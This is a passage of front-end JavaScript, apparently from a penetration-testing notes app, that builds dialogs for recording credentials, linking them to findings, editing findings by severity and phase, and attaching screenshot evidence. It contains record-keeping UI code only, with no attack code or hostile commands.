    container.querySelectorAll('[data-ev-open]').forEach(btn => {
      btn.addEventListener('click', () => {
        openEvidencePreview(btn.dataset.evOpen);
      });
    });

    /* Archived evidence toggle & actions */
    container.querySelector('#evmArchivedToggle')?.addEventListener('click', () => {
      const body = container.querySelector('#evmArchivedBody');
      const chevron = container.querySelector('#evmArchivedToggle .fm-archived-chevron');
      if (!body) return;
      const isHidden = body.style.display === 'none';
      body.style.display = isHidden ? 'block' : 'none';
      if (chevron) chevron.textContent = isHidden ? '▾' : '▸';
    });

    container.querySelectorAll('[data-evm-archived-open]').forEach(btn => {
      btn.addEventListener('click', () => openEvidencePreview(btn.dataset.evmArchivedOpen));
    });

    container.querySelectorAll('[data-evm-delete-archived]').forEach(btn => {
      btn.addEventListener('click', async () => {
        const evId = btn.dataset.evmDeleteArchived;
        if (!confirm('Permanently delete this archived evidence file?')) return;
        await deleteEvidenceFile(evId);
        machine.archived_evidence = (machine.archived_evidence || []).filter(e => e.id !== evId);
        addActivity('updated_machine', `Permanently deleted archived evidence: ${evId}`, machine.id);
        persist();
        renderContent();
      });
    });
  }

  renderContent();
  showDialogSafely(modal);
  modal.addEventListener('click', function backdropClose(e) {
    if (e.target === modal) { modal.close(); modal.removeEventListener('click', backdropClose); }
  });
}

/* ═══════════════════════════════════════════════
   Credential Edit Modal
   ═══════════════════════════════════════════════ */
function openCredAllModal(machine) {
  const modal = document.getElementById('credAllModal');
  const container = document.getElementById('credAllContent');
  if (!modal || !container) return;

  let linkingCredId = null;
  let showAddForm = false;
  let pendingDeleteId = null;

  function renderCredRows() {
    const creds = machineCredentials(machine.id);
    const findings = machineFindings(machine.id);

    function findingTitle(fid) {
      if (!fid) return '';
      const f = findings.find(f => f.id === fid);
      return f ? f.title : '(unknown)';
    }

    container.innerHTML = `
      <div class="cred-all-header">
        <h2>🔑 Credentials <span class="badge">${creds.length}</span></h2>
        <div class="cred-all-header-actions">
          <button class="btn btn-primary btn-sm" id="credAllAddToggle">＋ Add Credential</button>
          <button class="btn btn-ghost" id="credAllClose">✕</button>
        </div>
      </div>
      ${showAddForm ? `
        <div class="cred-all-add-form">
          <div class="split">
            <label>Username *<input id="caUsername" placeholder="admin" /></label>
            <label>Service<input id="caService" placeholder="SSH" /></label>
          </div>
          <label>Password / Hash<input id="caPassword" placeholder="" /></label>
          <label>Type
            <select id="caType">
              <option value="plain">Plain Text</option>
              <option value="hash">Hash</option>
              <option value="key">SSH Key</option>
              <option value="token">Token</option>
            </select>
          </label>
          <div class="modal-actions">
            <button class="btn btn-ghost btn-sm" id="caCancel">Cancel</button>
            <button class="btn btn-primary btn-sm" id="caSubmit">Add Credential</button>
          </div>
        </div>
      ` : ''}
      ${!creds.length && !showAddForm ? '<p class="small dim" style="padding:1rem;text-align:center">No credentials yet.</p>' : `
        <div class="cred-all-list">
          ${creds.map(c => `
            <div class="cred-all-row" data-cred-all-edit="${c.id}">
              <div class="cred-all-main">
                <span class="cred-all-username mono">${c.username}</span>
                <span class="badge">${c.cred_type}</span>
                ${c.service ? `<span class="small dim">${c.service}</span>` : ''}
                ${c.finding_id ? `<span class="cred-finding-badge">🔗 ${findingTitle(c.finding_id)}<button class="cred-unlink-btn" data-cred-unlink="${c.id}" title="Unlink finding">×</button></span>` : ''}
              </div>
              ${linkingCredId === c.id ? `
                <div class="cred-link-select-row">
                  <select class="cred-link-select" data-cred-link-select="${c.id}">
                    <option value="">— choose a finding —</option>
                    ${findings.map(f => `<option value="${f.id}"${f.id === c.finding_id ? ' selected' : ''}>${f.title} [${f.severity}]</option>`).join('')}
                  </select>
                  <button class="btn btn-ghost btn-sm" data-cred-link-cancel="${c.id}">Cancel</button>
                </div>
              ` : ''}
              <div class="cred-all-pw">
                <span class="mono">${state.reveal[c.id] ? (c.password || '—') : '••••••••'}</span>
                <button class="icon-btn" data-cred-all-reveal="${c.id}" title="${state.reveal[c.id] ? 'Hide' : 'Reveal'}">${state.reveal[c.id] ? '🙈' : '👁'}</button>
              </div>
              <div class="cred-all-actions">
                <button class="icon-btn${c.finding_id ? ' active' : ''}" data-cred-all-link="${c.id}" title="${c.finding_id ? 'Change linked finding' : 'Link to Finding'}" type="button">🔗</button>
                <button class="icon-btn" data-cred-all-edit="${c.id}" title="Edit" type="button">✎</button>
                ${pendingDeleteId === c.id
                  ? `<button class="icon-btn cred-delete-confirm" data-cred-confirm-delete="${c.id}" title="Click to confirm" type="button">Sure?</button>`
                  : `<button class="icon-btn" data-cred-all-delete="${c.id}" title="Delete" type="button">🗑</button>`}
              </div>
            </div>
          `).join('')}
        </div>
      `}
    `;

    container.querySelector('#credAllClose')?.addEventListener('click', () => modal.close());

    container.querySelector('#credAllAddToggle')?.addEventListener('click', () => {
      showAddForm = !showAddForm;
      renderCredRows();
      if (showAddForm) document.getElementById('caUsername')?.focus();
    });

    container.querySelector('#caCancel')?.addEventListener('click', () => {
      showAddForm = false;
      renderCredRows();
    });

    container.querySelector('#caSubmit')?.addEventListener('click', () => {
      const username = document.getElementById('caUsername').value.trim();
      if (!username) { document.getElementById('caUsername').focus(); return; }
      const password = document.getElementById('caPassword').value;
      const service = document.getElementById('caService').value.trim();
      const credType = document.getElementById('caType').value;

      state.credentials.unshift({
        id: uid('c'),
        machine_id: machine.id,
        username,
        password,
        service,
        cred_type: credType,
        created_at: nowStamp(),
      });

      addActivity('added_credential', `Added credential: ${username} (${service || credType})`, machine.id);
      showAddForm = false;
      persist();
      renderCredRows();
    });

    container.querySelectorAll('[data-cred-all-reveal]').forEach(btn => {
      btn.addEventListener('click', e => {
        e.stopPropagation();
        const id = btn.dataset.credAllReveal;
        state.reveal[id] = !state.reveal[id];
        renderCredRows();
      });
    });

    container.querySelectorAll('[data-cred-all-link]').forEach(btn => {
      btn.addEventListener('click', e => {
        e.stopPropagation();
        linkingCredId = (linkingCredId === btn.dataset.credAllLink) ? null : btn.dataset.credAllLink;
        renderCredRows();
      });
    });

    container.querySelectorAll('[data-cred-link-select]').forEach(sel => {
      sel.addEventListener('change', () => {
        const id = sel.dataset.credLinkSelect;
        const cred = state.credentials.find(c => c.id === id);
        if (!cred) return;
        const fid = sel.value || null;
        cred.finding_id = fid;
        addActivity('updated_machine', fid
          ? `Linked credential "${cred.username}" to finding "${findingTitle(fid)}"`
          : `Unlinked credential "${cred.username}" from finding`, machine.id);
        persist();
        linkingCredId = null;
        renderCredRows();
      });
    });

    container.querySelectorAll('[data-cred-link-cancel]').forEach(btn => {
      btn.addEventListener('click', e => {
        e.stopPropagation();
        linkingCredId = null;
        renderCredRows();
      });
    });

    container.querySelectorAll('[data-cred-unlink]').forEach(btn => {
      btn.addEventListener('click', e => {
        e.stopPropagation();
        const id = btn.dataset.credUnlink;
        const cred = state.credentials.find(c => c.id === id);
        if (!cred) return;
        cred.finding_id = null;
        addActivity('updated_machine', `Unlinked credential "${cred.username}" from finding`, machine.id);
        persist();
        renderCredRows();
      });
    });

    container.querySelectorAll('[data-cred-all-edit]').forEach(el => {
      el.addEventListener('click', e => {
        if (e.target.closest('[data-cred-all-reveal],[data-cred-all-delete],[data-cred-confirm-delete],[data-cred-all-link],[data-cred-link-select],[data-cred-link-cancel],[data-cred-unlink]')) return;
        modal.close();
        openCredEditModal(el.dataset.credAllEdit);
      });
    });

    container.querySelectorAll('[data-cred-all-delete]').forEach(btn => {
      btn.addEventListener('click', e => {
        e.stopPropagation();
        pendingDeleteId = btn.dataset.credAllDelete;
        renderCredRows();
      });
    });

    container.querySelectorAll('[data-cred-confirm-delete]').forEach(btn => {
      btn.addEventListener('click', e => {
        e.stopPropagation();
        const id = btn.dataset.credConfirmDelete;
        const cred = state.credentials.find(c => c.id === id);
        if (!cred) return;
        state.credentials = state.credentials.filter(c => c.id !== id);
        addActivity('updated_machine', `Deleted credential: ${cred.username}`, machine.id);
        pendingDeleteId = null;
        persist();
        renderCredRows();
      });
    });
  }

  renderCredRows();
  showDialogSafely(modal);
  modal.addEventListener('close', function onClose() {
    modal.removeEventListener('close', onClose);
    mount();
  });
  modal.addEventListener('click', function backdropClose(e) {
    if (e.target === modal) { modal.close(); modal.removeEventListener('click', backdropClose); }
  });
}

function openCredEditModal(credId) {
  const credential = state.credentials.find(c => c.id === credId);
  if (!credential) return;
  const modal = document.getElementById('credEditModal');
  const container = document.getElementById('credEditContent');
  if (!modal || !container) return;

  container.innerHTML = `
    <h2>Edit Credential</h2>
    <div class="split">
      <label>Username *<input id="ceUsername" value="${(credential.username || '').replace(/"/g, '&quot;')}" /></label>
      <label>Service<input id="ceService" value="${(credential.service || '').replace(/"/g, '&quot;')}" /></label>
    </div>
    <label>Password / Hash<input id="cePassword" type="text" value="${(credential.password || '').replace(/"/g, '&quot;')}" /></label>
    <label>Type
      <select id="ceType">
        ${['plain','hash','key','token'].map(t => `<option value="${t}"${t === credential.cred_type ? ' selected' : ''}>${t.charAt(0).toUpperCase() + t.slice(1)}</option>`).join('')}
      </select>
    </label>
    <div class="modal-actions">
      <button class="btn btn-ghost" id="ceCancel">Cancel</button>
      <button class="btn btn-primary" id="ceSave">Save</button>
    </div>
  `;

  container.querySelector('#ceCancel').addEventListener('click', () => modal.close());
  container.querySelector('#ceSave').addEventListener('click', () => {
    const username = document.getElementById('ceUsername').value.trim();
    if (!username) { document.getElementById('ceUsername').focus(); return; }
    credential.username = username;
    credential.service  = document.getElementById('ceService').value.trim();
    credential.password = document.getElementById('cePassword').value;
    credential.cred_type = document.getElementById('ceType').value;
    addActivity('updated_machine', `Edited credential: ${credential.username} (${credential.service || credential.cred_type})`, credential.machine_id);
    modal.close();
    mount();
  });

  showDialogSafely(modal);
  document.getElementById('ceUsername')?.select();
  modal.addEventListener('click', function backdropClose(e) {
    if (e.target === modal) { modal.close(); modal.removeEventListener('click', backdropClose); }
  });
}

/* ═══════════════════════════════════════════════
   Quick Finding Modal (checklist task / evidence)
   ═══════════════════════════════════════════════ */
function openQuickFindingModal(machine, itemId, prefillEvidence = []) {
  const item = checklistItemById(itemId);
  const phase = checklistPhaseForItem(itemId);
  const modal = document.getElementById('quickFindingModal');
  const container = document.getElementById('quickFindingContent');
  if (!modal || !container) return;

  const parentOptions = () => {
    const selPhase = container.querySelector('#qfPhase')?.value || phase?.id || '';
    const epQf = buildEligibleParents(machine.id, selPhase, new Set());
    let opts = epQf.samePhase.map(p => `<option value="${p.id}">${p.title} [${p.severity}]</option>`).join('');
    if (epQf.crossPhase.length) {
      const prevLabel = checklistPhases.find(p => p.id === epQf.prevPhaseId)?.name || epQf.prevPhaseId;
      opts += `<optgroup label="Cross-phase (${prevLabel})">` +
        epQf.crossPhase.map(p => `<option value="${p.id}">${p.title} [${p.severity}]</option>`).join('') + '</optgroup>';
    }
    return opts;
  };

  container.innerHTML = `
    <h2 style="margin-bottom:.25rem">Create Finding</h2>
    <div class="small dim" style="margin-bottom:1rem;opacity:.7">from checklist: <em>${item?.name || itemId}</em></div>
    <label>Title *<input id="qfTitle" value="${(item?.name || '').replace(/"/g, '&quot;')}" /></label>
    <label>Description<textarea id="qfDesc" rows="3" style="width:100%;margin-top:.4rem;background:var(--bg);border:1px solid var(--line);color:var(--text);border-radius:.45rem;padding:.55rem .6rem"></textarea></label>
    <div class="split">
      <label>Severity
        <select id="qfSev">
          ${['critical','high','medium','low','info'].map(s => `<option value="${s}"${s === 'info' ? ' selected' : ''}>${s.charAt(0).toUpperCase() + s.slice(1)}</option>`).join('')}
        </select>
      </label>
      <label>Phase
        <select id="qfPhase">
          ${checklistPhases.map(p => `<option value="${p.id}"${p.id === (phase?.id || '') ? ' selected' : ''}>${p.name}</option>`).join('')}
        </select>
      </label>
    </div>
    <label>Parent Finding
      <select id="qfParentId">
        <option value="">Root Level (no parent)</option>
        ${parentOptions()}
      </select>
    </label>
    ${prefillEvidence.length ? `
      <div style="margin-top:.6rem">
        <div class="small dim" style="margin-bottom:.3rem">Evidence attached (${prefillEvidence.length} file${prefillEvidence.length > 1 ? 's' : ''})</div>
        <div class="evidence-list">
          ${prefillEvidence.map(f => `<div class="evidence-row"><span class="small">${f.name}</span></div>`).join('')}
        </div>
      </div>
    ` : ''}
    <div class="modal-actions">
      <button class="btn btn-ghost" id="qfSkip">Skip</button>
      <button class="btn btn-primary" id="qfSave">Create Finding</button>
    </div>
  `;

  container.querySelector('#qfPhase')?.addEventListener('change', () => {
    const sel = container.querySelector('#qfParentId');
    if (!sel) return;
    sel.innerHTML = '<option value="">Root Level (no parent)</option>' + parentOptions();
  });

  container.querySelector('#qfSkip').addEventListener('click', () => modal.close());
  container.querySelector('#qfSave').addEventListener('click', () => {
    const title = document.getElementById('qfTitle').value.trim();
    if (!title) { document.getElementById('qfTitle').focus(); return; }
    const finding = {
      id: uid('f'),
      machine_id: machine.id,
      title,
      description: document.getElementById('qfDesc').value,
      severity: document.getElementById('qfSev').value,
      phase: document.getElementById('qfPhase').value,
      parent_id: document.getElementById('qfParentId').value || null,
      category: 'finding',
      evidence: [...prefillEvidence],
      source_checklist_item_id: itemId,
      created_at: nowStamp(),
      updated_at: nowStamp(),
    };
    state.findings.unshift(finding);
    addActivity('added_finding', `Added finding from checklist: ${finding.title} [${finding.severity.toUpperCase()} | ${finding.phase}]${prefillEvidence.length ? ` with ${prefillEvidence.length} evidence file(s)` : ''}`, machine.id);
    modal.close();
    mount();
  });

  showDialogSafely(modal);
  document.getElementById('qfTitle')?.select();
  modal.addEventListener('click', function backdropClose(e) {
    if (e.target === modal) { modal.close(); modal.removeEventListener('click', backdropClose); }
  });
}

/* ═══════════════════════════════════════════════
   Finding Edit Modal (findings tab → direct edit)
   ═══════════════════════════════════════════════ */
function openFindingEditModal(findingId) {
  const finding = state.findings.find(f => f.id === findingId);
  if (!finding) return;
  const modal = document.getElementById('findingEditModal');
  const container = document.getElementById('findingEditContent');
  let femEvidenceBuffer = [];

  // Build eligible parent options (exclude self and all descendants)
  function getDescendantIds(id, all) {
    return [id, ...all.filter(f => f.parent_id === id).flatMap(c => getDescendantIds(c.id, all))];
  }
  const excludeIds = new Set(getDescendantIds(finding.id, state.findings));
  const ep = buildEligibleParents(finding.machine_id, finding.phase, excludeIds);
  const parentOptsSame = ep.samePhase.map(p => `<option value="${p.id}"${p.id === finding.parent_id ? ' selected' : ''}>${p.title} [${p.severity}]</option>`).join('');
  const parentOptsCross = ep.crossPhase.length
    ? `<optgroup label="Cross-phase (${checklistPhases.find(p => p.id === ep.prevPhaseId)?.name || ep.prevPhaseId})">` +
      ep.crossPhase.map(p => `<option value="${p.id}"${p.id === finding.parent_id ? ' selected' : ''}>${p.title} [${p.severity}]</option>`).join('') +
      '</optgroup>' : '';
  const createdText = formatDateTimeMilitary(finding.created_at);
  const changedText = formatDateTimeMilitary(finding.updated_at || finding.created_at);

  const existingEvidence = finding.evidence || [];

  container.innerHTML = `
    <div class="finding-modal-header">
      <div class="finding-modal-title-row">
        <h2 style="margin:0">Edit Finding</h2>
      </div>
      <div class="finding-modal-meta">
        <div class="finding-modal-meta-row"><span>Creation:</span><strong>${createdText}</strong></div>
        <div class="finding-modal-meta-row"><span>Last Changed:</span><strong>${changedText}</strong></div>
      </div>
    </div>
    <label>Title *<input id="femTitle" value="${(finding.title || '').replace(/"/g, '&quot;')}" /></label>
    <label>Description<textarea id="femDesc" rows="3" style="width:100%;margin-top:.4rem;background:var(--bg);border:1px solid var(--line);color:var(--text);border-radius:.45rem;padding:.55rem .6rem">${(finding.description || '').replace(/</g, '&lt;')}</textarea></label>
    <div class="split">
      <label>Severity
        <select id="femSev">
          ${['critical','high','medium','low','info'].map(s => `<option value="${s}"${s === finding.severity ? ' selected' : ''}>${s.charAt(0).toUpperCase() + s.slice(1)}</option>`).join('')}
        </select>
      </label>
      <label>Phase
        <select id="femPhase">
          ${checklistPhases.map(p => `<option value="${p.id}"${p.id === finding.phase ? ' selected' : ''}>${p.name}</option>`).join('')}
        </select>
      </label>
    </div>
    <label>Parent Finding
      <select id="femParentId">
        <option value="">Root Level (no parent)</option>
        ${parentOptsSame}${parentOptsCross}
      </select>
    </label>
    <div class="finding-cred-box">
      <div class="small dim" style="margin-bottom:.35rem">Credentials linked to this finding</div>
      <div id="femLinkedCreds" class="finding-cred-links"></div>
      <div class="cred-action-prompt">
        <button type="button" class="btn btn-ghost" id="femShowLinkCred">Link Credential</button>
        <button type="button" class="btn btn-ghost" id="femShowCreateCred">Create New Credential</button>
      </div>
      <div id="femLinkCredSection" style="display:none">
        <label style="margin-top:.55rem">Link Existing Credential
          <select id="femLinkCredSelect"></select>
        </label>
      </div>
      <div id="femCreateCredSection" style="display:none">
        <div class="split" style="margin-top:.3rem">
          <label>Username *<input id="femNewCredUser" placeholder="admin" /></label>
          <label>Service<input id="femNewCredSvc" placeholder="SSH" /></label>
        </div>
        <div class="split" style="margin-top:.3rem">
          <label>Password / Hash<input id="femNewCredPass" /></label>
          <label>Type
            <select id="femNewCredType">
              <option value="plain">Plain Text</option>
              <option value="hash">Hash</option>
              <option value="key">SSH Key</option>
              <option value="token">Token</option>
            </select>
          </label>
        </div>
        <div style="display:flex;justify-content:flex-end;margin-top:.35rem">
          <button type="button" class="btn btn-primary" id="femCreateLinkCred">Create & Link</button>
        </div>
      </div>
    </div>
    <div style="margin-top:.6rem">
      <div class="small dim" style="margin-bottom:.3rem">Evidence</div>
      <input id="femEvidenceInput" type="file" accept="image/*" multiple style="display:none">
      <div class="evidence-dropzone" id="femEvidenceDrop" tabindex="0">Drop screenshots here or click and press Ctrl+V to paste</div>
      ${existingEvidence.length ? `
        <div class="small dim" style="margin-top:.5rem;margin-bottom:.2rem">Existing</div>
        <div class="evidence-list" id="femExistingEvidence">
          ${existingEvidence.map(file => `
            <div class="evidence-row" data-fem-existing="${file.id}">
              <button class="btn btn-ghost evidence-open" data-fem-open-evidence="${file.id}" type="button">${file.name}</button>
              <div class="evidence-actions">
                <button class="icon-btn" data-fem-rename-evidence="${file.id}" type="button" title="Rename">Rename</button>
                <button class="icon-btn" data-fem-delete-evidence="${file.id}" type="button" title="Delete">Delete</button>
              </div>
            </div>
          `).join('')}
        </div>
      ` : ''}
      <div class="evidence-list" id="femNewEvidenceList"></div>
    </div>
    <div class="modal-actions">
      <button class="btn btn-ghost" id="femCancel">Cancel</button>
      <button class="btn btn-primary" id="femSave">Save</button>
    </div>
  `;

  // Track which existing evidence to remove
  const removedEvidenceIds = new Set();
  const renamedEvidenceNames = new Map();

  function renderFemBuffer() {
    const list = document.getElementById('femNewEvidenceList');
    if (!list) return;
    if (!femEvidenceBuffer.length) { list.innerHTML = ''; return; }
    list.innerHTML = '<div class="small dim" style="margin-bottom:.2rem">New</div>' + femEvidenceBuffer.map((file, i) => `
      <div class="evidence-row">
        <span class="small">${file.name}</span>
        <button class="icon-btn" data-fem-remove-buffer="${i}" type="button" title="Remove">🗑</button>
      </div>
    `).join('');
    list.querySelectorAll('[data-fem-remove-buffer]').forEach(btn => {
      btn.addEventListener('click', () => {
        femEvidenceBuffer.splice(Number(btn.dataset.femRemoveBuffer), 1);
        renderFemBuffer();
      });
    });
  }

  function addFemFiles(files) {
    const imageFiles = getImageFilesFromList(files);
    if (!imageFiles.length) return;
    femEvidenceBuffer.push(...imageFiles);
    renderFemBuffer();
  }

  function refreshFemCredentialSection() {
    const linkedHost = container.querySelector('#femLinkedCreds');
    const select = container.querySelector('#femLinkCredSelect');
    if (!linkedHost || !select) return;

    const creds = machineCredentials(finding.machine_id);
    const linked = creds.filter(c => c.finding_id === finding.id);

    linkedHost.innerHTML = linked.length
      ? linked.map(c => `
        <div class="finding-cred-row">
          <span class="mono">${(c.username || '').replace(/</g, '&lt;')}</span>
          <span class="small dim">${(c.service || c.cred_type || '').replace(/</g, '&lt;')}</span>
          <button type="button" class="icon-btn" data-fem-unlink-cred="${c.id}" title="Unlink">×</button>
        </div>
      `).join('')
      : '<div class="small dim">No linked credentials.</div>';

    const options = creds
      .filter(c => !c.finding_id || c.finding_id === finding.id)
      .map(c => `<option value="${c.id}">${c.username}${c.service ? ` (${c.service})` : ''}</option>`)
      .join('');
    select.innerHTML = '<option value="">Select credential</option>' + options;

    select.addEventListener('change', () => {
      const credId = select.value;
      if (!credId) return;
      const cred = state.credentials.find(c => c.id === credId);
      if (!cred) return;
      cred.finding_id = finding.id;
      finding.updated_at = nowStamp();
      addActivity('updated_machine', `Linked credential "${cred.username}" to finding "${finding.title}"`, finding.machine_id);
      persist();
      refreshFemCredentialSection();
    });

    linkedHost.querySelectorAll('[data-fem-unlink-cred]').forEach(btn => {
      btn.addEventListener('click', () => {
        const cred = state.credentials.find(c => c.id === btn.dataset.femUnlinkCred);
        if (!cred) return;
        cred.finding_id = null;
        finding.updated_at = nowStamp();
        addActivity('updated_machine', `Unlinked credential "${cred.username}" from finding "${finding.title}"`, finding.machine_id);
        persist();
        refreshFemCredentialSection();
      });
    });
  }

  // Rebuild parent options dynamically when phase changes (fem)
  container.querySelector('#femPhase')?.addEventListener('change', (e) => {
    const sel = container.querySelector('#femParentId');
    if (!sel) return;
    const newPhaseFindings = machineFindings(finding.machine_id).filter(f => !excludeIds.has(f.id) && f.phase === e.target.value);
    sel.innerHTML = '<option value="">Root Level (no parent)</option>' +
      newPhaseFindings.map(p => `<option value="${p.id}"${p.id === finding.parent_id ? ' selected' : ''}>${p.title} [${p.severity}]</option>`).join('');
  });

  // File input
  const femInput = container.querySelector('#femEvidenceInput');
  femInput.addEventListener('change', (e) => { addFemFiles(e.target.files || []); e.target.value = ''; });

  // Dropzone
  const femDrop = container.querySelector('#femEvidenceDrop');
  femDrop.addEventListener('click', () => femInput.click());
  femDrop.addEventListener('dragover', (e) => { e.preventDefault(); femDrop.classList.add('drag-over'); });
  femDrop.addEventListener('mouseenter', () => { femDrop.focus({ preventScroll: true }); });
  femDrop.addEventListener('dragleave', () => { femDrop.classList.remove('drag-over'); });
  femDrop.addEventListener('drop', (e) => { e.preventDefault(); femDrop.classList.remove('drag-over'); addFemFiles(e.dataTransfer?.files || []); });
  femDrop.addEventListener('paste', (e) => { const f = getImageFilesFromList(e.clipboardData?.files || []); if (f.length) { e.preventDefault(); addFemFiles(f); } });

  // Open existing evidence
  container.querySelectorAll('[data-fem-open-evidence]').forEach(btn => {
    btn.addEventListener('click', () => openEvidencePreview(btn.dataset.femOpenEvidence));
  });

  // Delete existing evidence
  container.querySelectorAll('[data-fem-rename-evidence]').forEach(btn => {
    btn.addEventListener('click', () => {
      const evId = btn.dataset.femRenameEvidence;
      const file = (finding.evidence || []).find(entry => entry.id === evId);
      if (!file) return;
      const nextName = window.prompt('Rename evidence file', file.name || 'evidence.png');
      if (!nextName || !nextName.trim()) return;
      const cleanName = nextName.trim();
      file.name = cleanName;
      renamedEvidenceNames.set(evId, cleanName);
      const fileBtn = container.querySelector('[data-fem-open-evidence="' + evId + '"]');
      if (fileBtn) fileBtn.textContent = cleanName;
    });
  });

  container.querySelectorAll('[data-fem-delete-evidence]').forEach(btn => {
    btn.addEventListener('click', () => {
      const evId = btn.dataset.femDeleteEvidence;
      removedEvidenceIds.add(evId);
      renamedEvidenceNames.delete(evId);
      const row = container.querySelector('[data-fem-existing="' + evId + '"]');
      if (row) row.remove();
    });
  });

  container.querySelector('#femCancel').addEventListener('click', () => modal.close());

  // Credential section prompt toggles
  container.querySelector('#femShowLinkCred')?.addEventListener('click', () => {
    const linkSec = container.querySelector('#femLinkCredSection');
    const createSec = container.querySelector('#femCreateCredSection');
    const linkBtn = container.querySelector('#femShowLinkCred');
    const createBtn = container.querySelector('#femShowCreateCred');
    if (linkSec.style.display === 'none') {
      linkSec.style.display = '';
      createSec.style.display = 'none';
      linkBtn.classList.add('active');
      createBtn.classList.remove('active');
    } else {
      linkSec.style.display = 'none';
      linkBtn.classList.remove('active');
    }
  });

  container.querySelector('#femShowCreateCred')?.addEventListener('click', () => {
    const linkSec = container.querySelector('#femLinkCredSection');
    const createSec = container.querySelector('#femCreateCredSection');
    const linkBtn = container.querySelector('#femShowLinkCred');
    const createBtn = container.querySelector('#femShowCreateCred');
    if (createSec.style.display === 'none') {
      createSec.style.display = '';
      linkSec.style.display = 'none';
      createBtn.classList.add('active');
      linkBtn.classList.remove('active');
    } else {
      createSec.style.display = 'none';
      createBtn.classList.remove('active');
    }
  });

  container.querySelector('#femCreateLinkCred')?.addEventListener('click', () => {
    const username = container.querySelector('#femNewCredUser')?.value.trim();
    if (!username) { container.querySelector('#femNewCredUser')?.focus(); return; }
    const credential = {
      id: uid('c'),
      machine_id: finding.machine_id,
      username,
      password: container.querySelector('#femNewCredPass')?.value || '',
      cred_type: container.querySelector('#femNewCredType')?.value || 'plain',
      service: container.querySelector('#femNewCredSvc')?.value || '',
      finding_id: finding.id,
      created_at: nowStamp(),
    };
    state.credentials.unshift(credential);
    finding.updated_at = nowStamp();
    addActivity('added_credential', `Added credential: ${credential.username} (${credential.service || credential.cred_type})`, credential.machine_id);
    addActivity('updated_machine', `Linked credential "${credential.username}" to finding "${finding.title}"`, finding.machine_id);
    container.querySelector('#femNewCredUser').value = '';
    container.querySelector('#femNewCredPass').value = '';
    container.querySelector('#femNewCredSvc').value = '';
    container.querySelector('#femNewCredType').value = 'plain';
    persist();
    refreshFemCredentialSection();
  });

  refreshFemCredentialSection();

  container.querySelector('#femSave').addEventListener('click', async () => {
    const title = document.getElementById('femTitle').value.trim();
    if (!title) return;
    finding.title = title;
    finding.description = document.getElementById('femDesc').value;
    finding.severity = document.getElementById('femSev').value;
    finding.phase = document.getElementById('femPhase').value;
    finding.parent_id = document.getElementById('femParentId').value || null;
    finding.updated_at = nowStamp();

    for (const [evId, newName] of renamedEvidenceNames.entries()) {
      if (!removedEvidenceIds.has(evId)) {
        await updateEvidenceRecordName(evId, newName);
      }
    }

    // Remove deleted evidence from IndexedDB
    for (const evId of removedEvidenceIds) {
      await deleteEvidenceFile(evId);
    }

    // Store new evidence files
    const newEvidence = [];
    for (const file of femEvidenceBuffer) {
      const stored = await putEvidenceFile(file);
      newEvidence.push(stored);
    }

    // Merge: keep existing (minus removed) + add new
    finding.evidence = [
      ...(finding.evidence || []).filter(f => !removedEvidenceIds.has(f.id)),
      ...newEvidence,
    ];

    const totalAdded = newEvidence.length;
    const totalRemoved = removedEvidenceIds.size;
    let evidenceNote = '';
    if (totalAdded || totalRemoved) {
      const parts = [];
      if (totalAdded) parts.push('+' + totalAdded + ' evidence');
      if (totalRemoved) parts.push('-' + totalRemoved + ' evidence');
      evidenceNote = ' (' + parts.join(', ') + ')';
    }
    addActivity('updated_machine', 'Edited finding: ' + finding.title + ' [' + finding.severity.toUpperCase() + ' | ' + finding.phase + ']' + evidenceNote, finding.machine_id);
    modal.close();
    mount();
  });

  showDialogSafely(modal);
  modal.addEventListener('click', function backdropClose(e) {
    if (e.target === modal) { modal.close(); modal.removeEventListener('click', backdropClose); }
  });
}

function fillMachineSelect() {
  const select = document.getElementById('credMachineSelect');
  select.innerHTML = '<option value="">Select machine</option>' + state.machines.map((machine) => `<option value="${machine.id}">${machine.ip}${machine.hostname ? ` (${machine.hostname})` : ''}</option>`).join('');
}

window.addEventListener('hashchange', mount);

document.getElementById('sidebarToggle').addEventListener('click', () => {
  state.ui.sidebarCollapsed = !state.ui.sidebarCollapsed;
  sidebar.classList.toggle('collapsed', state.ui.sidebarCollapsed);
  brand.style.display = state.ui.sidebarCollapsed ? 'none' : 'block';
  document.getElementById('sidebarToggle').textContent = state.ui.sidebarCollapsed ? '▶' : '◀';
  persist();
});

document.getElementById('cancelMachine').addEventListener('click', () => {
  document.getElementById('machineModal').close();
});

document.getElementById('cancelCred').addEventListener('click', () => {
  document.getElementById('credModal').close();
});

document.getElementById('machineForm').addEventListener('submit', (event) => {
  event.preventDefault();
  const form = new FormData(event.target);
  const machine = {
    id: uid('m'),
    ip: String(form.get('ip') || '').trim(),
    hostname: String(form.get('hostname') || '').trim(),
    os_type: String(form.get('os_type') || 'linux'),
    tags: String(form.get('tags') || '').split(',').map((item) => item.trim()).filter(Boolean),
    osint_enabled: true,
    persistence_enabled: true,
    status: 'pending',
    created_at: nowStamp(),
    notes: '',
    selected_ports: [],
    completed_items: [],
    item_notes: {},
    item_evidence: {},
  };

  if (!machine.ip) return;

  state.machines.unshift(machine);
  addActivity('added_machine', `Added machine ${machine.ip} (${machine.os_type})`, machine.id);
  document.getElementById('machineModal').close();
  event.target.reset();
  mount();
});

document.getElementById('credForm').addEventListener('submit', (event) => {
  event.preventDefault();
  const form = new FormData(event.target);
  const credential = {
    id: uid('c'),
    machine_id: String(form.get('machine_id') || ''),
    username: String(form.get('username') || '').trim(),
    password: String(form.get('password') || ''),
    cred_type: String(form.get('cred_type') || 'plain'),
    service: String(form.get('service') || ''),
    created_at: nowStamp(),
  };

  if (!credential.machine_id || !credential.username) return;

  state.credentials.unshift(credential);
  addActivity('added_credential', `Added credential: ${credential.username} (${credential.service || credential.cred_type})`, credential.machine_id);
  document.getElementById('credModal').close();
  event.target.reset();
  mount();
});

if (state.ui.sidebarCollapsed) {
  sidebar.classList.add('collapsed');
  brand.style.display = 'none';
  document.getElementById('sidebarToggle').textContent = '▶';
}

if (!window.location.hash) window.location.hash = '#/';
requestPersistentStorage();
mount();
